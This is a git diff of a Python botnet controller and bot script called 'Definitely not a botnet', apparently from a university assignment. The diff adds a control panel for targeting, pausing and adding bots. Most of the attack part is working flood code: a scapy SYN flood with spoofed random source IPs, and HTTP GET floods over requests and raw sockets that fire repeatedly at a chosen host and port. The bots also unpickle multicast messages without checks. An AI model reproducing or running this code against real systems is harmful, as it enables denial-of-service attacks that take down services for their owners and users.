@@ -1,24 +1,33 @@
 #Definitely not a botnet
-import base64
-from cgi import print_form
 from random import randint
+import signal
 import socket
 import struct
 import selectors
 import time
 import string
 import pickle
-import copy
-import datetime
 import sys
 import subprocess
-
+import requests
 import fcntl
 import os
 from scapy.all import *
 
-BASE62 = string.ascii_lowercase+string.ascii_uppercase+string.digits
 
+BASE62 = string.ascii_lowercase+string.ascii_uppercase+string.digits
+CURSOR_UP_ONE = '\x1b[1A' 
+ERASE_LINE = '\x1b[2K' 
+
+
+def signal_handler(signal, frame):
+    sys.stdout.write(CURSOR_UP_ONE) 
+    sys.stdout.write(ERASE_LINE) 
+    
+    print("\nGoodbye.")
+    exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
 
 # set sys.stdin non-blocking
 orig_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
@@ -32,20 +41,7 @@ def randomIP():
 	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
 	return ip
 
-def printMenu():
-                menu = """
-                    Available instructions:
-                    "stop" - stop the bots
-                    "status" - view botnet status
-                    "target" - change target
-                    "pause" - pause attack
-                    "resume" - resume attack 
-                    "add" - add a bot
-                    "add x" - add x bots (pausing is recommended ;) )
-                """
-                print(menu)
-                sys.stdout.write("> ")                                              # For that old-school IRC feel
-                sys.stdout.flush()
+
 class zerg:
     def __init__(self, name: str = ""):
 
@@ -94,10 +90,52 @@ class zerg:
         self.id = randint(0,1000000)
 #        self.connect()
 
+        self.user_out = ""
         hostname = socket.gethostname()
         self.address = socket.gethostbyname(hostname)
-        print("I AM:",self.address)
+        if name != "admin":
+            print("I AM:",self.address)
 
+        self.instruction_buf=[]
+
+    def add_buf(self,inp):
+        self.instruction_buf.append(inp)
+        if len(self.instruction_buf):
+            self.instruction_buf=self.instruction_buf[:5]
+
+    def printMenu(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
+
+        menu = f"""
+                         Definitely-Not-A-Botnet Control Panel   
+                #############################################################    
+                #                                                           #
+                #   Available instructions:                                 #
+                #   "stop" - stop the bots                                  #
+                #   "status" - view botnet status                           #
+                #   "target" - change target                                #
+                #   "pause" - pause attack                                  #
+                #   "resume" - resume attack                                #
+                #   "add" - add a bot                                       #
+                #   "add x" - add x bots (pausing is recommended ;) )       #
+                #                                                           #
+                #############################################################
+
+    .―――――――――――――――――――――――――――――――――.    .―――――――――――――――――――――――――――――――――――――――――――.
+    |                                 |    |                                           |
+    | Bots in swarm:{len(self.peers):17} |    | Targeting:{self.TARGET:>20}:{self.TARGETPORT:<9}: |
+    |                                 |    |                                           |
+    ˙―――――――――――――――――――――――――――――――――˙    ˙―――――――――――――――――――――――――――――――――――――――――――˙
+
+{self.user_out}
+> """
+        print(menu,end="")
+        self.sayPing()
+        self.user_out=""
+        
+
+
+        
     def countBots(self):
         try:
                 data, server = self.mCastSock.recvfrom(1024)
@@ -107,7 +145,7 @@ class zerg:
         else:
             recvMSG = pickle.loads(data) 
 
-            if  recvMSG['command'] =="imhere":
+            if  recvMSG['command'] =="pong":
                 if recvMSG['id'] in self.peers:
                     self.peers[recvMSG['id']]=[time.time()] # last seen at: now
                 else:
@@ -119,7 +157,6 @@ class zerg:
         '''Send a imhere message'''  # General Kenobi
         msg = {
             'command': 'imhere',
-            'id':self.id
 
         }
         encodedMSG = pickle.dumps(msg)
@@ -147,6 +184,8 @@ class zerg:
             'target':target,
             'port':port
         }
+        self.TARGET=target
+        self.TARGETPORT=port if port != "" else self.TARGETPORT
         encodedMSG = pickle.dumps(msg)
 
         self.mCastSock.setsockopt(
@@ -175,10 +214,23 @@ class zerg:
             socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
         self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
 
-    def sayAdd(self):
+    def sayPing(self):
         '''Send a foundpw message'''  # Win
         msg = {
-            'command': 'add',
+            'command': 'ping',
+        }
+        encodedMSG = pickle.dumps(msg)
+
+        self.mCastSock.setsockopt(
+            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
+        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
+
+    def sayPong(self):
+        '''Send a foundpw message'''  # Win
+        msg = {
+            'command': 'pong',
+            'id':self.id
+
         }
         encodedMSG = pickle.dumps(msg)
 
@@ -235,16 +287,13 @@ class zerg:
             elif cmd == "resume":
                 print("Resumed.")
                 self.pause = False
-            elif cmd == "add":
-                #os.system('/home/inryatt/Uni/3ano/apsei/CD/slave.py')
-                subprocess.Popen(["sudo","python3","/home/inryatt/Uni/3ano/apsei/CD/slave.py"], stdout=subprocess.DEVNULL,
-    stderr=subprocess.STDOUT)
-            
+            elif cmd=="ping":
+                self.sayPong()
             return
 
 
 
-    def attack(self):
+    def syn_attack(self):
         """Creates the AuthHeader with the created pw"""  
    
         s_port = randInt()
@@ -260,8 +309,29 @@ class zerg:
         TCP_Packet.flags = "S"
         TCP_Packet.seq = s_eq
         TCP_Packet.window = w_indow
-        
-        send(IP_Packet/TCP_Packet, verbose=0)
+        byt = (f"GET / HTTP/1.1\nHost: swarm\n\n").encode()
+        send(IP_Packet/TCP_Packet/byt, verbose=0)
+
+    def http_attack(self):
+        r = requests.get('http://'+self.TARGET+':'+str(self.TARGETPORT)+'/')
+
+    def http_attack_2(self):
+        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        try:
+            # Open the connection on that raw socket
+            dos.connect((self.TARGET, self.TARGETPORT))
+
+            # Send the request according to HTTP spec
+            #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
+            byt = (f"GET / HTTP/1.1\nHost: swarm\n\n").encode()
+            dos.send(byt)
+        except socket.error:
+            print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
+        finally:
+            # Close our socket gracefully
+            dos.shutdown(socket.SHUT_RDWR)
+            dos.close()
 
 
     def send_msg(self, msg):
@@ -271,10 +341,10 @@ class zerg:
 
 
     def controlLoop(self):
-
-        try:
+        #try:
+        
             print("Welcome to Definitely-A-Botnet")
-            printMenu()
+            self.printMenu()
             while(True):
                     toDo = self.sel.select(0)
                     for event, data in toDo:
@@ -287,42 +357,56 @@ class zerg:
                     for peer in expired:
                         self.peers.pop(peer)
                                 
-        except KeyboardInterrupt:
-            print("Shutting Down... Want to stop bots? y/n")
-            inp =input("> ")
-            if inp=="y":
-                self.sayStop()
-            else:
-                print("Goodbye")
-                exit(0)
+        #except KeyboardInterrupt:
+        #    print("Shutting Down... Want to stop bots? y/n")
+        #    inp=""
+#
+        #    inp = sys.stdin.read().rstrip("\n")   #Get user's input
+#
+        #    if inp=="y":
+        #        self.sayStop()
+        #    print("Goodbye")
+        #    #exit(0)
+            
 
     def controlInput(self):
-                
-                inp = sys.stdin.read().rstrip("\n")   #Get user's input
+                try:
+                    inp = sys.stdin.read().rstrip("\n")   #Get user's input
+                except TypeError:
+                    inp =""
+              #  window.getch()
+              #  if inp == keys.DOWN
+                self.user_out= self.user_out + f"> {inp}"
 
                 if(inp =="stop"):
                     self.sayStop()
                 elif(inp=="status"):
-                    print("Status Screen Goes here") #TODO status screen
-                    
-
-                    print(self.peers.keys())
-                    print(f"bots: {len(self.peers.keys())}")
+                    #print("Status Screen Goes here") #TODO status screen
+                    self.sayPing()
+                    bots = len(self.peers.keys())
+                    if bots == 0:
+                        self.user_out+="\nCome back in a bit."
+                    else:
+                        self.user_out+=f"\nbots: {bots}"
                 elif("target"in inp):
                     inp=inp.split(" ")
                     siz = len(inp)
                     if siz <2:
-                        print("Missing target!")
+                        self.user_out+="\nMissing target!"
                         
                     elif(siz==2):
                         self.sayTarget(inp[1] ,"")
+                        self.user_out+=f"\nTargeting {inp[1]}:5000"
                     elif(siz==3):
                         self.sayTarget(inp[1] ,inp[2])
+                        self.user_out+=f"\nTargeting {inp[1]}:{inp[2]}"
                     else:
                         print("idk man")
                 elif(inp=="pause"):
+                    self.user_out+=f"\nPausing."
                     self.sayPause()
                 elif(inp=="resume"):
+                    self.user_out+=f"\nResuming"
                     self.sayResume()
                 elif("add" in inp):
                     inp=inp.split(" ")
@@ -333,13 +417,13 @@ class zerg:
                         times=int(inp[1])
                     for i in range(0,times):
                         #self.sayAdd()
-                        subprocess.Popen(["sudo","python3","/home/inryatt/Uni/3ano/apsei/CD/slave.py"], stdout=subprocess.DEVNULL,    stderr=subprocess.STDOUT)
+                        subprocess.Popen(["sudo","python3","/home/inryatt/Uni/3ano/apsei/CD/slave.py"], stdout=subprocess.DEVNULL,    stderr=subprocess.DEVNULL)
 
 
-                    print(f"Adding {times} bots.")
+                    self.user_out+=f"\nAdding {times} new bots."
                 else:
-                    print("/!\ Invalid Command!")
-                printMenu()
+                    self.user_out+=f"\n/!\\ Invalid Command /!\\"
+                self.printMenu()
    
     def loop(self):
         '''Main Loop'''
@@ -355,12 +439,9 @@ class zerg:
                 if not self.pause:
                     
                     for i in range(10):
-                            self.attack()
+                            self.http_attack_2()
                     count+=1
-
-                    if count%10==0:
-                        count=0
-                        self.sayImHere()
+                    
 
                 expired = []
                 for peer in self.peers.keys():
